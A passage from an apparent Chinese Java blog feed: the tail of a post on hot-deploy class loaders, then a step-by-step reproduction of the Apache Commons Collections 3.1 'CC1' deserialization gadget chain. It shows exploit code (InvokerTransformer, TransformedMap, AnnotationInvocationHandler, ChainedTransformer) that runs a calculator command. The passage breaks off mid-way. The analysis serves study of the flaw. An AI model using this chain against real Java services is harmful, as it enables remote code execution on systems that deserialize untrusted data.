title="热部署类加载器"></a>热部署类加载器</h5><p>当我们调用<code>loadClass</code>方法加载类时，会采用双亲委派模式，即如果类已经被加载，就从缓存中获取，不会重新加载，如果同一个<code>class</code>被同一个类加载器加载多次，则会报错。因此我们要实现热部署让同一个<code>class</code>文件被不同的类加载器重复加载即可，但是不能调用<code>loadClass</code>方法，而应该调用<code>findClass</code>方法，避开双亲委派模式，从而实现同一个类被多次加载，实现热部署。</p><p>具体测试</p><p>使用<code>loadClass</code>加载，输出的<code>hashCode</code>是相同的，说明没有被重复加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader1 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        MyFileClassLoader classLoader2 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>,classLoader1);</span><br><span class="line">        Class&lt;?&gt; clazz1 = classLoader1.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2 = classLoader2.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        System.out.println(clazz1.hashCode());</span><br><span class="line">        System.out.println(clazz2.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>findClass</code>加载，输出的<code>hashCode</code>是不同的，说明被重复加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader1 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        MyFileClassLoader classLoader2 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>,classLoader1);</span><br><span class="line">        Class&lt;?&gt; clazz1 = classLoader1.findClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2 = classLoader2.findClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        System.out.println(clazz1.hashCode());</span><br><span class="line">        System.out.println(clazz2.hashCode());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类的显式与隐式加载"><a href="#类的显式与隐式加载" class="headerlink" title="类的显式与隐式加载"></a>类的显式与隐式加载</h4><p>类的加载方式是指虚拟机将<code>class</code>文件加载到内存的方式。</p><p>显式加载是指在Java代码中通过调用<code>ClassLoader</code>加载<code>class</code>对象，比如<code>Class.forName(String name)</code>或者<code>this.getClass().getClassLoader().loadClass()</code>加载类</p><p>隐式加载不需要在Java代码中明确调用加载的代码，而是通过虚拟机自动加载到内存中，比如在加载某个<code>class</code>时，该<code>class</code>引用了另外一个类的对象，那么这个对象的字节码文件就会被虚拟机自动加载到内存中。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;类的加载概述&quot;&gt;&lt;a href=&quot;#类的加载概述&quot; class=&quot;headerlink&quot; title=&quot;类的加载概述&quot;&gt;&lt;/a&gt;类的加载概述&lt;/h4&gt;&lt;p&gt;我们编写的&lt;code&gt;.java&lt;/code&gt;扩展名的源代码文件存储着要执行的程序逻辑，这些文件需要经过&lt;c
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC1链复现与分析</title>
    <link href="elssm.github.io/2021/10/27/Java-CC1%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>elssm.github.io/2021/10/27/Java-CC1链复现与分析/</id>
    <published>2021-10-27T14:20:34.000Z</published>
    <updated>2021-10-30T08:44:26.535Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h4><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。其实Java JDK已经提供了丰富的集合操作，但是在某些场合下，可能无法满足，apache commons组件提供了更加丰富的集数据结构。</p><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mac OS Big Sur</span><br><span class="line">JDK-7u6</span><br><span class="line">commons-collections3.1</span><br></pre></td></tr></table></figure><p>JDK7下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p><p><img src="/2021/10/27/Java-CC1链复现与分析/23.png" alt="23"></p><p>下载好之后查看本地JDK版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % ls /Library/Java/JavaVirtualMachines </span><br><span class="line">jdk1.7.0_06.jdkjdk1.8.0_191.jdk</span><br></pre></td></tr></table></figure><h5 id="IDEA配置"><a href="#IDEA配置" class="headerlink" title="IDEA配置"></a>IDEA配置</h5><p>创建好Maven项目之后，指定对应的JDK版本即可</p><p><img src="/2021/10/27/Java-CC1链复现与分析/1.png" alt="1"></p><p>Common Collections3.1通过maven添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="一个简单反射例子"><a href="#一个简单反射例子" class="headerlink" title="一个简单反射例子"></a>一个简单反射例子</h5><p>在分析该漏洞之前我们先写一个利用反射弹计算器的例子。后面的漏洞分析会基于这个例子进行修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        Class c = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Method m = c.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(r,<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="从Trnsformer看起"><a href="#从Trnsformer看起" class="headerlink" title="从Trnsformer看起"></a>从Trnsformer看起</h5><p>我们知道该漏洞的问题出现在Transformer接口类，因此我们首先查看一下实现这个类都有哪些方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/2.png" alt="2"></p><p>这个时候我们随便点进去一个方法看看具体是怎么实现的。例如在<code>ConstantTransformer</code>类返回的是一个常量。在<code>InvokerTransformer</code>类中实现的是一个反射调用，而且参数都是可控的。因此我们尝试利用<code>InvokerTransformer</code>来改写上面的反射的例子。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/3.png" alt="3"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>在<code>InvokerTransformer</code>类中存在三个参数是我们可控的，因此我们只需要按照transform方法中的调用方式传值就可以了。改写后的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候我们已经找到了一个点，是<code>InvokerTransformer.transform</code>这个方法，它是一个危险方法，接着我们向上继续找还有哪些调用了<code>transform</code>方法，最好是不同名的</p><p><img src="/2021/10/27/Java-CC1链复现与分析/4.png" alt="4"></p><h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h5><p>注意到<code>TransformedMap</code>这个类，因为在这个类中有好几处都调用了<code>transform</code>这个方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/5.png" alt="5"></p><p>跟进<code>checkSetValue</code>方法， 发现调用了<code>valueTransformer</code>的<code>transform</code>方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/6.png" alt="6"></p><p>找到<code>TransformedMap</code>的构造函数，发现传入了一个<code>map</code>和两个<code>Transformer</code>，可以理解为接受一个<code>map</code>并对这个<code>map</code>的<code>key</code>和<code>value</code>做一些操作，因为这是一个保护方法， 我们继续找一下在哪里调用了这个方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/7.png" alt="7"></p><p>在构造方法上面找到了<code>decorate</code>静态方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/8.png" alt="8"></p><p>接着我们向上查找哪些调用了<code>checkSetValue</code>方法，发现只有一处调用了该方法，继续跟进</p><p><img src="/2021/10/27/Java-CC1链复现与分析/9.png" alt="9"></p><p>发现是<code>AbstractInputCheckedMapDecorator</code>类中有一个<code>MapEntry</code>类，这个类调用了<code>setValue</code>方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/10.png" alt="10"></p><h5 id="MapEntry"><a href="#MapEntry" class="headerlink" title="MapEntry"></a>MapEntry</h5><p>这个时候我们梳理一遍，当我们遍历被修饰的<code>Map</code>的时候，就会走到<code>setValue</code>这个方法，从而会调用<code>checkSetValue</code>，接着调用到了<code>valueTransformer.transform</code>方法，之后就会走到<code>InvokerTransformer.transform</code>方法执行</p><p>我们再次尝试改写上面的例子，首先实例化一个<code>map</code>对象，并对<code>map</code>进行装饰，因为在后面执行<code>transform</code>方法的是<code>decorate</code>方法传入的第三个参数，因此我们可以给第二个参数传一个空值，之后通过<code>for</code>循环调用<code>setValue</code>方法将我们的<code>Runtime.getRuntime()</code>对象传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="jdk源码关联"><a href="#jdk源码关联" class="headerlink" title="jdk源码关联"></a>jdk源码关联</h5><p>这个时候我们继续向上寻找调用链，看哪些类调用了<code>setValue</code>方法，按照流程，我应该能找到在<code>AnnotationInvocationHandler</code>这个类的<code>readObject</code>方法里面调用了<code>setValue</code>方法，可是找了一圈，并没有。。。我以为是我jdk版本的问题，于是在jdk下面查看，路径是<code>rt.jar</code>下面的<code>sun.reflect.annotation</code>，发现这个类不是源代码，所以查找调用的时候不会出现。</p><p>对于这个问题我找到了一个相对合理的解答：因为sun包是hotspot虚拟机中java.<em> 和javax.</em>的底层实现。因为包含在rt中，所以我们也可以调用。但是因为不是sun对外公开承诺的接口，所以根据实现的需要随时增减，因此在不同版本的hotspot中可能是不同的，而且在其他的jdk实现中是没有的，调用这些类，可能不会向后兼容，所以一般不推荐使用。因此如果我们需要查看<code>rt.jar</code>包下的源码就需要进行源码关联。</p><p>JDK-7u6源代码地址：<a href="http://jdk7src.sourceforge.net" target="_blank" rel="noopener">http://jdk7src.sourceforge.net</a></p><p><img src="/2021/10/27/Java-CC1链复现与分析/24.png" alt="24"></p><p>下载好对应JDK版本之后，在IDEA中就可以设置。进入<code>File-&gt;Project Structrue-&gt;SDKs-&gt;Sourcepath</code>中添加即可</p><p><img src="/2021/10/27/Java-CC1链复现与分析/11.png" alt="11"></p><p>这个时候我们再次查看<code>AnnotationInvocationHandler</code>这个类，发现已经是源代码文件了，同样也在<code>setValue</code>放的的调用类中成功找到了这个类</p><p><img src="/2021/10/27/Java-CC1链复现与分析/12.png" alt="12"></p><h5 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h5><p>现在我们可以继续修改我们上面写的例子，将<code>AnnotationInvocationHandler</code>类加进去，尝试实例化这个类，但是由于该类不是<code>public</code>的，不能直接在外部调用，因此需要用到反射去获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor annotationInvocationHandler = c.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = annotationInvocationHandler.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String  Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="遇到的三个问题"><a href="#遇到的三个问题" class="headerlink" title="遇到的三个问题"></a>遇到的三个问题</h5><p>这里就会遇到三个问题，第一个问题是<code>setValue</code>，在上面的例子中我们<code>setValue</code>的值直接传入的是一个<code>Runtime</code>对象，但是在<code>AnnotationInvocationHandler</code>类中，这个传入的值并不是我们可控的。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/13.png" alt="13"></p><p>第二个问题是对于<code>Runtime</code>类，它并不是可序列化的，因为它没有继承<code>Serializable</code>接口，因此我们也需要通过反射来实现。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/14.png" alt="14"></p><p>第三个问题是进入<code>AnnotationInvocationHandler</code>类的<code>readObject</code>方法中的<code>setValue</code>方法需要满足两个if条件。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/15.png" alt="15"></p><h5 id="反射调用Runtime"><a href="#反射调用Runtime" class="headerlink" title="反射调用Runtime"></a>反射调用Runtime</h5><p>我们先解决第二个问题，将<code>Runtime</code>对象通过反射实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Runtime<span class="class">.<span class="keyword">class</span></span>; <span class="comment">//通过反射获取到字节码对象</span></span><br><span class="line">        Method getRuntimeMethod = c.getMethod(<span class="string">"getRuntime"</span>, <span class="keyword">null</span>); <span class="comment">//获取getRuntime静态方法</span></span><br><span class="line">        Runtime r = (Runtime) getRuntimeMethod.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>); <span class="comment">//获取Runtime对象</span></span><br><span class="line">        Method execMethod = c.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//反射调用exec方法</span></span><br><span class="line">        execMethod.invoke(r,<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们把这个反射调用改成<code>InvokerTransformer</code>的形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;).transform(Runtime.class);</span><br><span class="line">        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;).transform(r);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>我们可以发现，实际上是对<code>InvokerTransformer</code>类的<code>transform</code>方法连续调用了三次，不由想到在之前的<code>Transformer</code>的实现类中有一个<code>ChainedTransformer</code>，在它的<code>transform</code>方法中就是一个循环调用的形式。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/16.png" alt="16"></p><p>因此我们尝试使用<code>ChainedTransformer</code>类调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">      chainedTransformer.transform(Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Target-class"><a href="#Target-class" class="headerlink" title="Target.class"></a>Target.class</h5><p>接着我们继续修改两个if判断的问题。在第一个if之前首先会遍历我们传入的map并将key赋给name，此时我们拿到的name就是在map中put的<code>key</code>，之后会通过<code>memberTypes.get</code>方法获取name，将值赋给memberType。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/17.png" alt="17"></p><p>由于我们现在传入的是<code>Override.class</code>，在<code>Override</code>中并没有存在成员方法，因此在get的时候就拿不到任何值，所以得到的<code>memberType</code>就为空。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/18.png" alt="18"></p><p><img src="/2021/10/27/Java-CC1链复现与分析/20.png" alt="20"></p><p>因此我们需要找一个有成员方法的class，并将map传入的<code>key</code>值改为成员方法的名字，才可以进入第一层if判断，所以我们使用<code>Target.class</code>代替，并将<code>map.put</code>的<code>key</code>值改为<code>value</code></p><p><img src="/2021/10/27/Java-CC1链复现与分析/19.png" alt="19"></p><p><img src="/2021/10/27/Java-CC1链复现与分析/21.png" alt="21"></p><p>在第二个判断语句中使用<code>isInstance</code>判断是否可以强转，这个判断很明显是<code>false</code>,取反之后正好可以让我们进入第二层if判断，从而执行<code>setValue</code>方法</p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>现在我们接着解决上面的第一个问题，就是需要将<code>setValue</code>中的代理替换成我们的<code>Runtime.class</code>，可以通过<code>ConstantTransformer</code>实现。前面讲到了<code>ConstantTransformer</code>的<code>transform</code>方法接收一个输入并返回一个常量，因此我们只需要传入<code>Runtime.class</code>即可</p><p><img 